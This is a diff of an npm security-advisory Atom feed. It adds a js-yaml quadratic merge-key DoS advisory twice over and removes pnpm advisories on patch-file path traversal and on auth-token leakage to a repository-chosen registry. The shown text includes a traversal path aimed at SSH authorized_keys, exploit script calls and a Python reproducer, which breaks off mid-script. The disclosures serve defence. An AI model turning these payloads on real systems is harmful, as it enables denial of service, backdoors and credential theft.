@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-06-29T15:05:41.815Z</updated>
+    <updated>2026-06-29T16:57:03.380Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,236 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[js-yaml] JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases]]></title>
+        <id>https://github.com/advisories/GHSA-h67p-54hq-rp68</id>
+        <link href="https://github.com/advisories/GHSA-h67p-54hq-rp68"/>
+        <updated>2026-06-29T15:06:00.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A crafted YAML document can trigger algorithmic CPU exhaustion in <code>js-yaml</code> merge-key processing (<code>&lt;&lt;</code>) by repeating the same alias many times in a merge sequence.<br>This causes quadratic parse-time behavior relative to input size and can block a Node.js worker/event loop for seconds with a relatively small payload (tens of KB), resulting in denial of service.</p>
+<h3 id="details">Details</h3>
+<p>The issue is in merge handling inside <code>lib/loader.js</code>:</p>
+<ul>
+<li><code>storeMappingPair(...)</code> iterates every element of a merge sequence when key tag is <code>tag:yaml.org,2002:merge</code>.</li>
+<li>For each element, it calls <code>mergeMappings(...)</code>.</li>
+<li><code>mergeMappings(...)</code> computes <code>Object.keys(source)</code> and performs <code>_hasOwnProperty.call(destination, key)</code> checks for each key.</li>
+</ul>
+<p>When input is of the form:</p>
+<p>a: &amp;a {k0:0, k1:0, ..., kK:0}
+b: {&lt;&lt;: [*a, *a, *a, ... repeated M times ...]}
+all *a entries refer to the same anchored object. After the first merge, subsequent merges are semantically no-ops, but the parser still reprocesses all keys each time.
+Resulting work is O(K * M), while input size is O(K + M), giving quadratic scaling as payload grows.
+Relevant code path:
+lib/loader.js in storeMappingPair(...) merge branch (keyTag === 'tag:yaml.org,2002:merge')
+lib/loader.js mergeMappings(...)</p>
+<h3 id="root-cause">Root cause</h3>
+<p>File:       lib/loader.js
+Function:   storeMappingPair(state, _result, overridableKeys, keyTag, keyNode,
+                             valueNode, startLine, startLineStart, startPos)
+Lines:      ~359-366</p>
+<pre><code>if (keyTag === 'tag:yaml.org,2002:merge') {
+  if (Array.isArray(valueNode)) {
+    for (index = 0, quantity = valueNode.length; index &lt; quantity; index += 1) {
+      mergeMappings(state, _result, valueNode[index], overridableKeys);
+    }
+  } else {
+    mergeMappings(state, _result, valueNode, overridableKeys);
+  }
+}
+</code></pre>
+<p>When the merge value is a sequence (YAML 1.1 &lt;&lt;: [ *a, *a, ... ]), each element
+is handed to mergeMappings() without deduplication. mergeMappings() then does</p>
+<pre><code>sourceKeys = Object.keys(source);
+for (index = 0; index &lt; sourceKeys.length; index += 1) {
+  key = sourceKeys[index];
+  if (!_hasOwnProperty.call(destination, key)) {
+    setProperty(destination, key, source[key]);
+    overridableKeys[key] = true;
+  }
+}
+</code></pre>
+<p>Every alias reference in the sequence resolves (by design) to the SAME object
+via state.anchorMap. After the first merge, every subsequent merge of that same
+reference is a pure no-op semantically, but still performs:</p>
+<ul>
+<li>one Object.keys(source) call (O(K))</li>
+<li>K _hasOwnProperty.call checks on the destination</li>
+</ul>
+<p>Total: M * K hasOwnProperty checks + M Object.keys allocations, while the final
+object and all observable side effects are identical to a single merge.</p>
+<p>YAML semantics for <code>&lt;&lt;:</code> are idempotent and commutative over duplicate sources,
+so collapsing duplicates preserves behavior exactly; this isn't a spec trade-off.</p>
+<h3 id="poc">PoC</h3>
+<p>Environment:
+js-yaml version: 4.1.1
+Node.js: v24.5.0
+Platform: arm64 macOS (reproduced consistently)
+Reproduction script:
+Create many keys in one anchored map (&amp;a).
+Merge that same alias repeatedly via &lt;&lt;: [*a, *a, ...].
+Measure parse time and compare with control payload using single merge (&lt;&lt;: *a).
+Observed repeated runs (same machine):
+K=M=1000, input 9,909 bytes: ~33–36 ms
+K=M=2000, input 20,909 bytes: ~121–123 ms
+K=M=4000, input 42,909 bytes: ~524–537 ms
+K=M=6000, input 64,909 bytes: ~1,608–1,829 ms
+K=M=8000, input 86,909 bytes: ~3,395–3,565 ms
+Control (single merge, similar key counts):
+K=2000: ~1–2 ms
+K=4000: ~3 ms
+K=8000: ~5 ms
+Also verified: repeated-merge output equals single-merge output (same key count and same JSON), confirming excess time is redundant computation.</p>
+<h3 id="impact">Impact</h3>
+<p>This is a denial-of-service vulnerability (CPU exhaustion / algorithmic complexity).
+Any service parsing untrusted YAML with js-yaml can be impacted, including API backends, CI tools, config processors, and automation services. An attacker can submit crafted YAML to significantly increase CPU time and reduce availability.</p>
+<h3 id="suggested-fix">Suggested fix:</h3>
+<p>Dedupe the merge source list by reference before invoking mergeMappings. Any of
+the following are minimal and preserve YAML 1.1 merge semantics:</p>
+<p>dedupe in storeMappingPair:</p>
+<pre><code>if (keyTag === 'tag:yaml.org,2002:merge') {
+  if (Array.isArray(valueNode)) {
+    var seen = new Set();
+    for (index = 0, quantity = valueNode.length; index &lt; quantity; index += 1) {
+      var src = valueNode[index];
+      if (seen.has(src)) continue;   // idempotent; skip redundant alias
+      seen.add(src);
+      mergeMappings(state, _result, src, overridableKeys);
+    }
+  } else {
+    mergeMappings(state, _result, valueNode, overridableKeys);
+  }
+}
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodeca/js-yaml/security/advisories/GHSA-h67p-54hq-rp68">https://github.com/nodeca/js-yaml/security/advisories/GHSA-h67p-54hq-rp68</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53550">https://nvd.nist.gov/vuln/detail/CVE-2026-53550</a></li>
+<li><a href="https://github.com/advisories/GHSA-h67p-54hq-rp68">https://github.com/advisories/GHSA-h67p-54hq-rp68</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h67p-54hq-rp68</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-15T17:15:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[js-yaml] JS-YAML: Quadratic-complexity DoS in merge key handling via repeated aliases]]></title>
+        <id>https://github.com/advisories/GHSA-h67p-54hq-rp68</id>
+        <link href="https://github.com/advisories/GHSA-h67p-54hq-rp68"/>
+        <updated>2026-06-29T15:06:00.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>A crafted YAML document can trigger algorithmic CPU exhaustion in <code>js-yaml</code> merge-key processing (<code>&lt;&lt;</code>) by repeating the same alias many times in a merge sequence.<br>This causes quadratic parse-time behavior relative to input size and can block a Node.js worker/event loop for seconds with a relatively small payload (tens of KB), resulting in denial of service.</p>
+<h3 id="details">Details</h3>
+<p>The issue is in merge handling inside <code>lib/loader.js</code>:</p>
+<ul>
+<li><code>storeMappingPair(...)</code> iterates every element of a merge sequence when key tag is <code>tag:yaml.org,2002:merge</code>.</li>
+<li>For each element, it calls <code>mergeMappings(...)</code>.</li>
+<li><code>mergeMappings(...)</code> computes <code>Object.keys(source)</code> and performs <code>_hasOwnProperty.call(destination, key)</code> checks for each key.</li>
+</ul>
+<p>When input is of the form:</p>
+<p>a: &amp;a {k0:0, k1:0, ..., kK:0}
+b: {&lt;&lt;: [*a, *a, *a, ... repeated M times ...]}
+all *a entries refer to the same anchored object. After the first merge, subsequent merges are semantically no-ops, but the parser still reprocesses all keys each time.
+Resulting work is O(K * M), while input size is O(K + M), giving quadratic scaling as payload grows.
+Relevant code path:
+lib/loader.js in storeMappingPair(...) merge branch (keyTag === 'tag:yaml.org,2002:merge')
+lib/loader.js mergeMappings(...)</p>
+<h3 id="root-cause">Root cause</h3>
+<p>File:       lib/loader.js
+Function:   storeMappingPair(state, _result, overridableKeys, keyTag, keyNode,
+                             valueNode, startLine, startLineStart, startPos)
+Lines:      ~359-366</p>
+<pre><code>if (keyTag === 'tag:yaml.org,2002:merge') {
+  if (Array.isArray(valueNode)) {
+    for (index = 0, quantity = valueNode.length; index &lt; quantity; index += 1) {
+      mergeMappings(state, _result, valueNode[index], overridableKeys);
+    }
+  } else {
+    mergeMappings(state, _result, valueNode, overridableKeys);
+  }
+}
+</code></pre>
+<p>When the merge value is a sequence (YAML 1.1 &lt;&lt;: [ *a, *a, ... ]), each element
+is handed to mergeMappings() without deduplication. mergeMappings() then does</p>
+<pre><code>sourceKeys = Object.keys(source);
+for (index = 0; index &lt; sourceKeys.length; index += 1) {
+  key = sourceKeys[index];
+  if (!_hasOwnProperty.call(destination, key)) {
+    setProperty(destination, key, source[key]);
+    overridableKeys[key] = true;
+  }
+}
+</code></pre>
+<p>Every alias reference in the sequence resolves (by design) to the SAME object
+via state.anchorMap. After the first merge, every subsequent merge of that same
+reference is a pure no-op semantically, but still performs:</p>
+<ul>
+<li>one Object.keys(source) call (O(K))</li>
+<li>K _hasOwnProperty.call checks on the destination</li>
+</ul>
+<p>Total: M * K hasOwnProperty checks + M Object.keys allocations, while the final
+object and all observable side effects are identical to a single merge.</p>
+<p>YAML semantics for <code>&lt;&lt;:</code> are idempotent and commutative over duplicate sources,
+so collapsing duplicates preserves behavior exactly; this isn't a spec trade-off.</p>
+<h3 id="poc">PoC</h3>
+<p>Environment:
+js-yaml version: 4.1.1
+Node.js: v24.5.0
+Platform: arm64 macOS (reproduced consistently)
+Reproduction script:
+Create many keys in one anchored map (&amp;a).
+Merge that same alias repeatedly via &lt;&lt;: [*a, *a, ...].
+Measure parse time and compare with control payload using single merge (&lt;&lt;: *a).
+Observed repeated runs (same machine):
+K=M=1000, input 9,909 bytes: ~33–36 ms
+K=M=2000, input 20,909 bytes: ~121–123 ms
+K=M=4000, input 42,909 bytes: ~524–537 ms
+K=M=6000, input 64,909 bytes: ~1,608–1,829 ms
+K=M=8000, input 86,909 bytes: ~3,395–3,565 ms
+Control (single merge, similar key counts):
+K=2000: ~1–2 ms
+K=4000: ~3 ms
+K=8000: ~5 ms
+Also verified: repeated-merge output equals single-merge output (same key count and same JSON), confirming excess time is redundant computation.</p>
+<h3 id="impact">Impact</h3>
+<p>This is a denial-of-service vulnerability (CPU exhaustion / algorithmic complexity).
+Any service parsing untrusted YAML with js-yaml can be impacted, including API backends, CI tools, config processors, and automation services. An attacker can submit crafted YAML to significantly increase CPU time and reduce availability.</p>
+<h3 id="suggested-fix">Suggested fix:</h3>
+<p>Dedupe the merge source list by reference before invoking mergeMappings. Any of
+the following are minimal and preserve YAML 1.1 merge semantics:</p>
+<p>dedupe in storeMappingPair:</p>
+<pre><code>if (keyTag === 'tag:yaml.org,2002:merge') {
+  if (Array.isArray(valueNode)) {
+    var seen = new Set();
+    for (index = 0, quantity = valueNode.length; index &lt; quantity; index += 1) {
+      var src = valueNode[index];
+      if (seen.has(src)) continue;   // idempotent; skip redundant alias
+      seen.add(src);
+      mergeMappings(state, _result, src, overridableKeys);
+    }
+  } else {
+    mergeMappings(state, _result, valueNode, overridableKeys);
+  }
+}
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nodeca/js-yaml/security/advisories/GHSA-h67p-54hq-rp68">https://github.com/nodeca/js-yaml/security/advisories/GHSA-h67p-54hq-rp68</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-53550">https://nvd.nist.gov/vuln/detail/CVE-2026-53550</a></li>
+<li><a href="https://github.com/advisories/GHSA-h67p-54hq-rp68">https://github.com/advisories/GHSA-h67p-54hq-rp68</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-h67p-54hq-rp68</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-15T17:15:07.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[pnpm] pnpm: Path traversal in configDependencies env lockfile allows symlink creation outside node_modules/.pnpm-config]]></title>
         <id>https://github.com/advisories/GHSA-qrv3-253h-g69c</id>
@@ -2186,429 +2416,5 @@ Exploit script: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_au
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-26T22:59:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pnpm] pnpm Vulnerable to Arbitrary File Write/Delete via Malicious Patch File (Path Traversal)]]></title>
-        <id>https://github.com/advisories/GHSA-rxhj-4m44-96r4</id>
-        <link href="https://github.com/advisories/GHSA-rxhj-4m44-96r4"/>
-        <updated>2026-06-26T22:59:49.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>pnpm's patch application pipeline (<code>@pnpm/patch-package</code>) performs no path validation on file paths extracted from <code>.patch</code> files. An attacker who contributes a malicious patch file via a pull request can write attacker-controlled content to or delete arbitrary files on the filesystem during <code>pnpm install</code>, as the user running the install. The <code>diff --git</code> header paths containing <code>../../</code> sequences traverse out of the package directory, and the traversal is difficult to catch in code review because patch file diff headers are opaque to most reviewers.</p>
-<h2 id="vulnerability-details">Vulnerability Details</h2>
-<p>During <code>pnpm install</code>, when a <code>patchedDependencies</code> entry is present in <code>pnpm-workspace.yaml</code>, pnpm reads the referenced <code>.patch</code> file and applies it via the embedded <code>@pnpm/patch-package</code> library. The <code>applyPatchToDir</code> function at <code>patching/apply-patch/src/index.ts:12-13</code> calls <code>process.chdir(opts.patchedDir)</code>, setting the working directory to the installed package location deep inside <code>node_modules/.pnpm/</code>.</p>
-<p>The patch parser at <code>@pnpm/patch-package/dist/patch/parse.js:88</code> extracts file paths from <code>diff --git a/(.*?) b/(.*?)</code> headers using a regex with no path sanitization. The <code>executeEffects</code> function in <code>apply.js</code> then operates on these unsanitized paths:</p>
-<p><strong>File write</strong> (<code>apply.js:35-49</code>):</p>
-<pre><code class="language-javascript">case 'file creation': {
-  const eff = effect
-  fs.ensureDirSync(dirname(eff.path))
-  fs.writeFileSync(eff.path, fileContents, { mode: eff.mode })
-  break
-}
-</code></pre>
-<p><strong>File delete</strong> (<code>apply.js:13-22</code>):</p>
-<pre><code class="language-javascript">case 'file deletion': {
-  const eff = effect
-  // TODO: integrity checks
-  if (!opts.dryRun) {
-    fs.unlinkSync(eff.path)
-  }
-  break
-}
-</code></pre>
-<p>A path like <code>../../../../../../../../../../home/user/.ssh/authorized_keys</code> in the patch header traverses out of the package directory to an arbitrary location.</p>
-<h2 id="proof-of-concept">Proof of Concept</h2>
-<pre><code class="language-bash"># Write variant:
-bash autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh
-# Result: PASS -- /tmp/vuln6_pwned created with attacker-controlled content
-
-# Delete variant:
-bash autofyn_audit/exploits/vuln7_patch_traversal_delete/exploit.sh
-# Result: PASS -- /tmp/vuln7_target deleted by malicious patch
-
-# Combined chain (delete + replace SSH authorized_keys):
-bash autofyn_audit/exploits/chain2_patch_ssh_backdoor/exploit.sh
-# Result: PASS -- authorized_keys replaced with attacker's public key
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>Arbitrary file write and delete as the user running <code>pnpm install</code>, limited to paths writable by that user. An attacker who submits a PR adding a <code>.patch</code> file and <code>patchedDependencies</code> config can target SSH authorized_keys, shell configuration, CI/CD files, or other writable files. Patch files may receive less review scrutiny than <code>package.json</code> changes because the <code>../</code> traversal sequences are in <code>diff --git</code> headers that look like patch metadata.</p>
-<h2 id="suggested-remediation">Suggested Remediation</h2>
-<p>Validate parsed patch file paths against the package root directory. Reject any path that resolves outside the patched package directory via <code>path.resolve</code> + prefix check. Alternatively, sanitize at parse time by rejecting paths containing <code>..</code> components in <code>parse.js</code>.</p>
-<hr>
-<blockquote>
-<p>Discovered by <a href="https://github.com/SignalPilot-Labs/AutoFyn">AutoFyn</a>
-Full audit report: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/audit_report.md">audit_report.md</a>
-Exploit script: <a href="https://github.com/tempcollab/pnpm/blob/main/autofyn_audit/exploits/vuln6_patch_traversal_write/exploit.sh">exploit.sh</a></p>
-</blockquote>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-rxhj-4m44-96r4">https://github.com/pnpm/pnpm/security/advisories/GHSA-rxhj-4m44-96r4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-50015">https://nvd.nist.gov/vuln/detail/CVE-2026-50015</a></li>
-<li><a href="https://github.com/advisories/GHSA-rxhj-4m44-96r4">https://github.com/advisories/GHSA-rxhj-4m44-96r4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-rxhj-4m44-96r4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-26T22:59:48.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[pnpm] pnpm binds unscoped user-level npm auth credentials to a repository-selected registry]]></title>
-        <id>https://github.com/advisories/GHSA-cjhr-43r9-cfmw</id>
-        <link href="https://github.com/advisories/GHSA-cjhr-43r9-cfmw"/>
-        <updated>2026-06-26T22:59:26.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>pnpm can send user-level unscoped npm authentication credentials to a registry chosen by a repository-local <code>.npmrc</code> file.</p>
-<p>In the reproduced case, the user's npm config contains a default registry and an unscoped <code>_authToken</code>. The repository does not provide a token-bearing auth line. It only sets <code>registry=</code> to a different registry URL. During normal pnpm metadata/install workflows, pnpm binds the user-origin unscoped credential to the repository-selected registry and sends it as an <code>Authorization</code> header.</p>
-<p>This was reproduced with fake credentials and loopback registries only. No third-party registry or real token was used.</p>
-<h2 id="affected-behavior-observed">Affected Behavior Observed</h2>
-<p>Observed affected:</p>
-<ul>
-<li>pnpm <code>10.33.2</code>: <code>pnpm install --ignore-scripts</code> sends the user-level unscoped <code>_authToken</code> to the repository-selected registry.</li>
-<li>pnpm <code>11.1.3</code>: <code>pnpm install --ignore-scripts</code> sends the user-level unscoped <code>_authToken</code> to the repository-selected registry.</li>
-<li>pnpm <code>11.2.1</code> (<code>next-11</code> dist tag at testing time): <code>pnpm install --ignore-scripts</code> sends the user-level unscoped <code>_authToken</code> to the repository-selected registry.</li>
-<li>pnpm <code>11.1.3</code>: <code>pnpm view</code> also sends user-level unscoped <code>_authToken</code>, <code>_auth</code>, and <code>username</code> / <code>_password</code> credentials to the repository-selected registry in the local loopback replay.</li>
-</ul>
-<p>Control:</p>
-<ul>
-<li>npm <code>10.9.7</code> rejects the same unscoped user <code>_authToken</code> configuration with <code>ERR_INVALID_AUTH</code> and does not send an <code>Authorization</code> header to the  repository-selected registry.</li>
-<li>URL-scoped registry token controls held in the local loopback replay: tokens scoped to the trusted registry URL were not sent to the attacker registry.</li>
-</ul>
-<h2 id="threat-model">Threat Model</h2>
-<p>Victim:</p>
-<ul>
-<li>developer or CI job with user-level npm registry credentials configured;</li>
-<li>runs <code>pnpm install</code>, <code>pnpm view</code>, or an equivalent pnpm metadata/restore command in a repository.</li>
-</ul>
-<p>Attacker:</p>
-<ul>
-<li>controls repository-local package manager configuration, such as <code>.npmrc</code>;</li>
-<li>can set <code>registry=</code> to a registry endpoint they control;</li>
-<li>does not need to provide a token-bearing auth line for the strong case.</li>
-</ul>
-<p>Boundary:</p>
-<p>Credentials from a higher-trust user configuration should not be rebound to a lower-trust repository-selected registry unless the credential is explicitly scoped to that registry.</p>
-<h2 id="minimal-reproduction">Minimal Reproduction</h2>
-<p>The reproducer below starts two loopback HTTP registries:</p>
-<ul>
-<li>a trusted registry URL used in the isolated user <code>.npmrc</code>;</li>
-<li>an attacker registry URL used in the repository-local <code>.npmrc</code>.</li>
-</ul>
-<p>The isolated user <code>.npmrc</code> contains:</p>
-<pre><code class="language-ini">registry=&lt;trusted-loopback-registry&gt;
-_authToken=PR166_FAKE_REGISTRY_TOKEN
-</code></pre>
-<p>The repository-local <code>.npmrc</code> contains:</p>
-<pre><code class="language-ini">registry=&lt;attacker-loopback-registry&gt;
-</code></pre>
-<p>The repository <code>package.json</code> depends on a toy package served by the loopback registry. The script then runs:</p>
-<pre><code class="language-text">pnpm install --ignore-scripts
-npm install --ignore-scripts
-</code></pre>
-<h2 id="expected-safe-behavior">Expected Safe Behavior</h2>
-<p>pnpm should not send the user-level unscoped <code>_authToken</code> to the repository-selected registry. A safe behavior would be to reject or ignore the unscoped credential in this lower-trust registry-rebinding situation and require the credential to be URL-scoped to the selected registry.</p>
-<h2 id="observed-behavior">Observed Behavior</h2>
-<p>pnpm <code>10.33.2</code>, pnpm <code>11.1.3</code>, and pnpm <code>11.2.1</code> send:</p>
-<pre><code class="language-http">Authorization: Bearer PR166_FAKE_REGISTRY_TOKEN
-</code></pre>
-<p>to the attacker loopback registry during install. npm <code>10.9.7</code> rejects the same config and sends no <code>Authorization</code> header.</p>
-<h2 id="security-impact">Security Impact</h2>
-<p>This can disclose npm registry credentials from user-level configuration to a registry endpoint selected by an untrusted repository. The leak occurs before package lifecycle scripts run and does not depend on package code execution.</p>
-<h2 id="non-claims">Non-Claims</h2>
-<p>This report does not claim:</p>
-<ul>
-<li>remote code execution;</li>
-<li>registry account compromise by itself;</li>
-<li>leakage of URL-scoped tokens for a different registry;</li>
-<li>npm CLI impact;</li>
-<li>impact from a repository explicitly committing its own token-bearing auth
-line.</li>
-</ul>
-<h2 id="source-level-notes">Source-Level Notes</h2>
-<p>In pnpm's config/auth-header flow, unscoped/default credentials are parsed from the merged auth config and stored as default credentials. The auth-header logic then maps those default credentials to the effective default registry. Because repository-local <code>.npmrc</code> can change the effective default registry, higher-trust default credentials can be applied to a lower-trust registry choice.</p>
-<h2 id="suggested-fix-direction">Suggested Fix Direction</h2>
-<p>The conservative fix direction is to reject or contain unscoped/default auth credentials when a lower-trust workspace/repository config changes the default registry. A compatibility-preserving fix could track the source layer of both the default registry and the default credentials, then only bind default credentials to a registry selected by the same or higher-trust source. A stricter npm-compatible fix would reject unscoped auth and require URL-scoped
-credentials.</p>
-<p>This needs maintainer semantic review and compatibility control because some legacy workflows may intentionally rely on default/unscoped auth.</p>
-<h2 id="runnable-reproducer">Runnable Reproducer</h2>
-<p>Save the following as <code>repro.py</code> and run it with Python 3 in an environment with pnpm and npm available. To force a specific pnpm version through Corepack, set <code>PR166_PNPM_SPEC</code>, for example <code>PR166_PNPM_SPEC=11.2.1</code>.</p>
-<pre><code class="language-python">import base64
-import contextlib
-import hashlib
-import http.server
-import io
-import json
-import os
-import shutil
-import subprocess
-import sys
-import tarfile
-import tempfile
-import threading
-from pathlib import Path
-
-
-"""Standalone loopback reproducer.
-
-It creates only temporary directories and loopback HTTP servers. Cleanup is handled by TemporaryDirectory context managers and registry shutdown handlers; no persistent state is expected outside the package-manager cache directories inside the temporary home. Non-claims: this does not use real credentials, third-party registries, package scripts, or remote services. Failure paths return exit 1 or exit 2 through sys.exit(main()).
-"""
-
-TOKEN = "PR166_FAKE_REGISTRY_TOKEN"
-PACKAGE_TGZ = None
-
-
-class RegistryHandler(http.server.BaseHTTPRequestHandler):
-    requests = []
-
-    def do_GET(self):
-        self.requests.append(
-            {
-                "method": self.command,
-                "path": self.path,
-                "authorization": self.headers.get("Authorization"),
-            }
-        )
-        if self.path.endswith(".tgz"):
-            payload = make_package_tgz()
-            self.send_response(200)
-            self.send_header("Content-Type", "application/octet-stream")
-            self.send_header("Content-Length", str(len(payload)))
-            self.end_headers()
-            self.wfile.write(payload)
-            return
-
-        payload = make_package_tgz()
-        body = json.dumps(
-            {
-                "name": "@private/probe",
-                "dist-tags": {"latest": "1.0.0"},
-                "versions": {
-                    "1.0.0": {
-                        "name": "@private/probe",
-                        "version": "1.0.0",
-                        "dist": {
-                            "tarball": f"http://127.0.0.1:{self.server.server_port}/private/@private/probe/-/probe-1.0.0.tgz",
-                            "shasum": hashlib.sha1(payload).hexdigest(),
-                            "integrity": "sha512-"
-                            + base64.b64encode(hashlib.sha512(payload).digest()).decode("ascii"),
-                        },
-                    }
-                },
-            }
-        ).encode("utf-8")
-        self.send_response(200)
-        self.send_header("Content-Type", "application/json")
-        self.send_header("Content-Length", str(len(body)))
-        self.end_headers()
-        self.wfile.write(body)
-
-    def log_message(self, fmt, *args):
-        return
-
-
-@contextlib.contextmanager
-def registry():
-    handler = type("RecordingRegistryHandler", (RegistryHandler,), {"requests": []})
-    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
-    thread = threading.Thread(target=server.serve_forever, daemon=True)
-    thread.start()
-    try:
-        yield server, handler.requests
-    finally:
-        server.shutdown()
-        thread.join(timeout=5)
-        server.server_close()
-
-
-def make_package_tgz():
-    global PACKAGE_TGZ
-    if PACKAGE_TGZ is not None:
-        return PACKAGE_TGZ
-    bio = io.BytesIO()
-    with tarfile.open(fileobj=bio, mode="w:gz") as tf:
-        data = b'{"name":"@private/probe","version":"1.0.0"}\n'
-        info = tarfile.TarInfo("package/package.json")
-        info.size = len(data)
-        tf.addfile(info, io.BytesIO(data))
-    PACKAGE_TGZ = bio.getvalue()
-    return PACKAGE_TGZ
-
-
-def write_text(path, text):
-    path.parent.mkdir(parents=True, exist_ok=True)
-    path.write_text(text, encoding="utf-8", newline="\n")
-
-
-def run_install(tool, trusted_url, attacker_url):
-    exe = shutil.which(tool)
-    if exe is None:
-        return {"tool": tool, "error": "missing"}
-    cmd = [exe, "install", "--ignore-scripts"]
-    if tool == "pnpm" and os.environ.get("PR166_PNPM_SPEC"):
-        corepack = shutil.which("corepack")
-        if corepack is None:
-            return {"tool": tool, "error": "corepack missing"}
-        cmd = [corepack, f"pnpm@{os.environ['PR166_PNPM_SPEC']}", "install", "--ignore-scripts"]
-
-    with tempfile.TemporaryDirectory(prefix=f"pr166-min-{tool}-") as td:
-        root = Path(td)
-        home = root / "home"
-        project = root / "project"
-        home.mkdir()
-        project.mkdir()
-        userconfig = home / ".npmrc"
-
-        write_text(userconfig, f"registry={trusted_url}\n_authToken={TOKEN}\n")
-        write_text(project / ".npmrc", f"registry={attacker_url}\n")
-        write_text(
-            project / "package.json",
-            '{"name":"pr166-probe","version":"1.0.0","dependencies":{"@private/probe":"1.0.0"}}\n',
-        )
-
-        env = os.environ.copy()
-        env.update(
-            {
-                "HOME": str(home),
-                "USERPROFILE": str(home),
-                "NPM_CONFIG_USERCONFIG": str(userconfig),
-                "npm_config_userconfig": str(userconfig),
-                "NPM_CONFIG_CACHE": str(home / "cache"),
-                "npm_config_cache": str(home / "cache"),
-                "NPM_CONFIG_STORE_DIR": str(home / "store"),
-                "npm_config_store_dir": str(home / "store"),
-                "XDG_CACHE_HOME": str(home / "xdg-cache"),
-                "XDG_DATA_HOME": str(home / "xdg-data"),
-                "NO_COLOR": "1",
-            }
-        )
-
-        proc = subprocess.run(
-            cmd,
-            cwd=str(project),
-            env=env,
-            text=True,
-            encoding="utf-8",
-            errors="replace",
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            timeout=60,
-        )
-        return {"tool": tool, "returncode": proc.returncode, "output_tail": proc.stdout[-2000:]}
-
-
-def summarize(tool, result, attacker_requests):
-    auth_hits = [r for r in attacker_requests if r.get("authorization")]
-    return {
-        "tool": tool,
-        "result": result,
-        "attacker_auth_hits": auth_hits,
-        "attacker_request_count": len(attacker_requests),
-    }
-
-
-def tool_version(tool):
-    exe = shutil.which(tool)
-    if exe is None:
-        return "missing"
-    cmd = [exe, "--version"]
-    if tool == "pnpm" and os.environ.get("PR166_PNPM_SPEC"):
-        corepack = shutil.which("corepack")
-        if corepack is None:
-            return "corepack missing"
-        cmd = [corepack, f"pnpm@{os.environ['PR166_PNPM_SPEC']}", "--version"]
-    proc = subprocess.run(
-        cmd,
-        text=True,
-        encoding="utf-8",
-        errors="replace",
-        stdout=subprocess.PIPE,
-        stderr=subprocess.STDOUT,
-        timeout=20,
-    )
-    return proc.stdout.strip() or f"exit-{proc.returncode}"
-
-
-def main():
-    pnpm_version = tool_version("pnpm")
-    npm_version = tool_version("npm")
-    print(f"TARGET_VERSION=pnpm {pnpm_version}; npm {npm_version}")
-    if pnpm_version == "missing" or npm_version == "missing":
-        print("CHECK environment_has_pnpm_and_npm result=fail")
-        return 1
-
-    print("ENVIRONMENT_READY")
-    overall = []
-    with registry() as (trusted, _trusted_requests), registry() as (attacker, attacker_requests):
-        trusted_url = f"http://127.0.0.1:{trusted.server_port}/private/"
-        attacker_url = f"http://127.0.0.1:{attacker.server_port}/private/"
-
-        before = len(attacker_requests)
-        pnpm_result = run_install("pnpm", trusted_url, attacker_url)
-        pnpm_summary = summarize("pnpm", pnpm_result, attacker_requests[before:])
-        overall.append(pnpm_summary)
-
-        before = len(attacker_requests)
-        npm_result = run_install("npm", trusted_url, attacker_url)
-        npm_summary = summarize("npm", npm_result, attacker_requests[before:])
-        overall.append(npm_summary)
-
-    print(json.dumps(overall, indent=2))
-
-    pnpm_leaked = bool(overall[0]["attacker_auth_hits"])
-    npm_leaked = bool(overall[1]["attacker_auth_hits"])
-    print(f"OBSERVED_PNPM_AUTH_HITS={len(overall[0]['attacker_auth_hits'])}")
-    print(f"OBSERVED_NPM_AUTH_HITS={len(overall[1]['attacker_auth_hits'])}")
-    print(
-        "COMMAND_EXIT_CODE="
-        f"pnpm:{overall[0]['result'].get('returncode', 'missing')} "
-        f"npm:{overall[1]['result'].get('returncode', 'missing')}"
